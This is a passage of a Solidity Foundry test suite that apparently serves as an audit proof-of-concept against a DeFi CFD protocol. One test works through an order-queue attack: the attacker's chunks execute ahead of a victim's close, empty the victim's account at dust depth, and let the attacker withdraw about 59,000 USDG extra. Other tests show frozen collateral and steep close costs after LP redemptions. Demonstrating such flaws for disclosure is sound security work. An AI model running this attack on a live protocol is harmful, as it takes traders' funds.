        _closePosition(VICTIM, victimSize, PX);
        (uint256 withdrawn, bool ok) = _withdrawAll(VICTIM);

        _usd("victim close result", int256(_wealth(VICTIM)) - int256(before));
        _usd("victim withdrew", withdrawn);
        assertTrue(ok, "flat victim withdraws while degraded");
        assertGt(_wealth(VICTIM), before + 1000e6, "close is profitable at normal depth");
        assertEq(settlementToken.balanceOf(VICTIM), _wealth(VICTIM), "everything withdrawn to the wallet");
    }

    /// @notice Attack. ATTACKER's chunks execute ahead of VICTIM's close in FIFO order. VICTIM's close executes at
    ///         dust depth and leaves it with nothing. ATTACKER then withdraws VICTIM's money with further chunks.
    function test_Attack_VictimAccountSweptAtDustDepth() public {
        uint256 victimBefore = _wealth(VICTIM);
        uint256 depthAtCommit = _depth();
        int256 system0 = _systemValue();
        uint256 attackerBefore = clearinghouse.balanceAssets(ATTACKER) + settlementToken.balanceOf(ATTACKER);
        uint256 snap = vm.snapshotState();

        uint256 n = _queueChunksAheadOfVictim(type(uint256).max);
        _usd("depth when the victim commits its close", depthAtCommit);
        assertGt(depthAtCommit, 100_000e6, "normal depth at victim commit");
        for (uint256 i; i < n; ++i) {
            _exec(PX); // FIFO head: attacker chunks
        }
        console2.log("attacker chunks executed ahead of the victim", n);
        uint256 depthAtExec = _depth();
        _usd("depth when the victim's close executes", depthAtExec);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no claims: depth is dust but not zero");
        assertGt(depthAtExec, 0, "zero-depth exemption does not apply");
        assertLt(depthAtExec, 100e6, "depth below 100 USDG");

        _exec(PX); // victim's close
        assertEq(_size(VICTIM), 0, "victim close executed");
        _usd("victim account before", victimBefore);
        _usd("victim account after (balance + claim)", _wealth(VICTIM));
        _usd("pool cash after the victim's close", pool.totalAssets());
        assertEq(_wealth(VICTIM), 0, "victim account emptied, no claim recorded");

        (uint256 attackCash, uint256 attackClaim) = _attackerExit(attackerBefore);
        assertEq(_systemValue(), system0, "system value conserved: the victim's loss is a transfer");

        // Control: identical attacker strategy, but the victim does not close.
        vm.revertToState(snap);
        (uint256 controlCash, uint256 controlClaim) = _attackerExit(attackerBefore);

        _usd("attacker realized cash, attack", attackCash);
        _usd("attacker realized cash, control", controlCash);
        _usd("ATTACKER EXTRA CASH vs control", attackCash - controlCash);
        _usd("attacker claim left, attack", attackClaim);
        _usd("attacker claim left, control", controlClaim);
        assertGt(attackCash - controlCash, 59_000e6, "attacker cashes out the victim's funds");
        // Cash + claim is the same in both branches (to within carry on the extra blocks): the victim's funds turn
        // the attacker's unbacked claim into withdrawable cash.
        assertApproxEqAbs(attackCash + attackClaim, controlCash + controlClaim, 1e6, "victim cash replaces claim");
    }

    /// @notice A victim that bounds its action charge at 1,000 USDG (about 14% of its 7,000 notional) cannot close at
    ///         dust depth, and its idle collateral stays frozen: withdrawals revert while degraded with an open
    ///         position, and the owner cannot clear degraded mode without covering the whole deficit.
    function test_BoundedVictim_CannotCloseAndIdleCollateralFrozen() public {
        uint256 idle = clearinghouse.getFreeBuyingPowerAssets(VICTIM);

        // The same bounded close executes at normal depth.
        uint256 snap = vm.snapshotState();
        _commit(VICTIM, CfdTypes.Side.SHORT, victimSize, 0, true, 1000e6);
        _exec(PX);
        assertEq(_size(VICTIM), 0, "bounded close executes at normal depth");
        vm.revertToState(snap);

        uint256 n = _queueChunksAheadOfVictim(1000e6);
        for (uint256 i; i <= n; ++i) {
            _exec(PX);
        }
        _usd("depth when the bounded close was tried", _depth());
        assertEq(_size(VICTIM), victimSize, "bounded close did not execute at dust depth");

        vm.prank(VICTIM);
        (bool ok,) = address(clearinghouse).call(abi.encodeCall(clearinghouse.withdraw, (VICTIM, idle)));
        assertFalse(ok, "idle collateral cannot be withdrawn");

        vm.warp(vm.getBlockTimestamp() + 7 days);
        _mark(PX);
        vm.prank(VICTIM);
        (ok,) = address(clearinghouse).call(abi.encodeCall(clearinghouse.withdraw, (VICTIM, idle)));
        assertFalse(ok, "still frozen 7 days later");
        vm.prank(engine.owner());
        (ok,) = address(engine).call(abi.encodeCall(engine.clearDegradedMode, ()));
        assertFalse(ok, "owner cannot clear degraded mode without covering the deficit");
        _usd("victim idle collateral frozen", idle);
    }

    /// @notice No attacker and no ordering: the same close at organic depths a chunking winner passes through.
    function test_ChargeVsDepth_NoAttacker() public {
        uint256 before = _wealth(VICTIM);
        uint256 snap = vm.snapshotState();
        uint256[4] memory leaveLots = [uint256(1500), 500, 100, 10];
        for (uint256 i; i < leaveLots.length; ++i) {
            _drainChunk(leaveLots[i]);
            uint256 depth = _depth();
            _closePosition(VICTIM, victimSize, PX);
            _usd("depth", depth);
            _usd("   victim close result", int256(_wealth(VICTIM)) - int256(before));
            vm.revertToState(snap);
        }
        _closePosition(VICTIM, victimSize, PX);
        _usd("full depth: victim close result", int256(_wealth(VICTIM)) - int256(before));
    }

}

/// @title Close VPI is also unbounded in a pool that is not degraded, once LPs redeem to their limit
/// @notice LP redemptions stop at max liability + settlement buffer. A SHORT's max liability per token is
///         CAP - entry price, which shrinks as the basket rises, so after a normal LP exit depth can sit far below
///         skew. A minority LONG then pays several percent of its notional to close at an unchanged price, and the
///         excess over its margin comes out of its idle balance. No deficit, no claims, no attacker.
contract CloseVpiAtLpRedemptionLimitTest is DustDepthHarness {

    address internal constant LP = address(0x1B);
    address internal constant MAJORITY_SHORT = address(0x07E12);
    address internal constant VICTIM = address(0xA77AC);

    function setUp() public override {
        super.setUp();
        _lpDeposit(juniorVault, LP, 10_000_000e6, ONE);
        vm.warp(vm.getBlockTimestamp() + 1 days); // past the deposit cooldown, Tuesday
        _mark(ONE);
    }

    /// @dev Majority SHORT (10% margin) and minority LONG (2% margin, large idle balance) open at `price`; the LP
    ///      queues redemption of everything it is allowed to; the request matures at the next epoch.
    function _book(
        uint256 price,
        uint256 shortTokens,
        uint256 longTokens
    ) internal {
        _fundTrader(MAJORITY_SHORT, 2_000_000e6);
        _fundTrader(VICTIM, 500_000e6);
        _mark(price);
        _openPosition(MAJORITY_SHORT, CfdTypes.Side.SHORT, shortTokens, shortTokens * price / 1e20 / 10, price);
        _openPosition(VICTIM, CfdTypes.Side.LONG, longTokens, longTokens * price / 1e20 / 50, price);
        uint256 shares = juniorVault.maxRequestRedeem(LP);
        vm.prank(LP);
        uint256 requestId = juniorVault.requestRedeem(shares, LP, LP);
        vm.warp(juniorVault.depositEpochStart(requestId));
        _mark(price);
    }

    function _victimClose(
        uint256 price,
        uint256 longTokens,
        bool lpExitsFirst
    ) internal returns (int256 delta) {
        if (lpExitsFirst) {
            _settle(price);
        }
        uint256 before = _wealth(VICTIM);
        _closePosition(VICTIM, longTokens, price);
        delta = int256(_wealth(VICTIM)) - int256(before);
    }

    function _case(
        string memory label,
        uint256 price,
        uint256 shortTokens,
        uint256 longTokens
    ) internal returns (uint256 beforeBps, uint256 afterBps) {
        uint256 snap = vm.snapshotState();
        _book(price, shortTokens, longTokens);
        uint256 notional = longTokens * price / 1e20;

        uint256 inner = vm.snapshotState();
        uint256 depthBefore = _depth();
        int256 control = _victimClose(price, longTokens, false);
        vm.revertToState(inner);

        int256 atLimit = _victimClose(price, longTokens, true);
        assertFalse(engine.degradedMode(), "pool is not degraded");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claims");

        console2.log(label);
        _usd("  victim notional", notional);
        _usd("  victim position margin", notional / 50);
        _usd("  depth before the LP redeems", depthBefore);
        _usd("  depth after the LP redeems to its limit", _depth());
        _usd("  close result before the LP redeems", control);
        _usd("  close result after the LP redeems", atLimit);
        beforeBps = uint256(-control) * 10_000 / notional;
        afterBps = uint256(-atLimit) * 10_000 / notional;
        console2.log("  close cost in bps of notional, before:", beforeBps);
        console2.log("  close cost in bps of notional, after :", afterBps);
        vm.revertToState(snap);
    }

    function test_CloseCostAtLpRedemptionLimit_GrowsWithBasket() public {
        (uint256 b100, uint256 a100) =
            _case("basket 1.00: SHORT 2M tokens, victim LONG 0.2M tokens", 1e8, 2_000_000e18, 200_000e18);
        (uint256 b150, uint256 a150) =
            _case("basket 1.50: SHORT 2M tokens, victim LONG 0.2M tokens", 1.5e8, 2_000_000e18, 200_000e18);
        (uint256 b180, uint256 a180) =
            _case("basket 1.80: SHORT 2M tokens, victim LONG 0.1M tokens", 1.8e8, 2_000_000e18, 100_000e18);

        assertLt(b100, 50, "1.00: under 0.5% before the LP leaves");
        assertLt(b150, 50, "1.50: under 0.5% before the LP leaves");
        assertLt(b180, 50, "1.80: under 0.5% before the LP leaves");
        assertLt(a100, 100, "1.00: under 1% after");
        assertGt(a150, 250, "1.50: above 2.5% after");
        assertGt(a180, 800, "1.80: above 8%, more than four times the 2% position margin");
    }

}
```

